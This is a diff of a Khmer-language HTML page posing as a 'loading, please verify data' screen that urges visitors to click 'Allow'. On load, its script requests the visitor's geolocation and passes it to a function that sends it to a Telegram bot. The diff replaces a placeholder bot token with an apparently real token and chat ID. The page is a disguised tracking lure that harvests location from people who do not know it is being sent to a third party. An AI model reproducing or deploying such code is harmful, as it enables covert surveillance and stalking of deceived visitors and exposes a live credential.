@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>សូមរង់ចាំ...</title>
+    <title>កំពុងដំណើរការ...</title>
     <style>
         body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>កំពុងផ្ទុកទិន្នន័យ...</h2>
-    <p>សូមចុច <b>"Allow"</b> ឬ <b>"អនុញ្ញាត"</b> ប្រសិនបើមានការសួរដើម្បីបន្ត។</p>
+    <h2>កំពុងផ្ទៀងផ្ទាត់ទិន្នន័យ...</h2>
+    <p>សូមចុច <b>"Allow"</b> ឬ <b>"អនុញ្ញាត"</b> ប្រសិនបើមានការសុំសិទ្ធិ។</p>
 </div>
 
 <script>
-  ⁠window.onload = function() {⁠
-    const TELEGRAM_BOT_TOKEN = '7989111680:AAXXXXXXXXXXXXXX';
-const TELEGRAM_CHAT_ID = '1357654787';
+    const TELEGRAM_BOT_TOKEN = '7989111680:AAGsdsm1-mdYe9yIURI122IgR-ur0QKmDMo';
+    const TELEGRAM_CHAT_ID = '1357654787';
 
+    window.onload = function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(sendLocationToTelegram, function(error) {
                 alert("សូមអនុញ្ញាត Location ដើម្បីបន្ត!");
@@ -49,4 +49,8 @@ const TELEGRAM_CHAT_ID = '1357654787';
         });
     }
 </script>
+
+</body>
+</html>
+
 
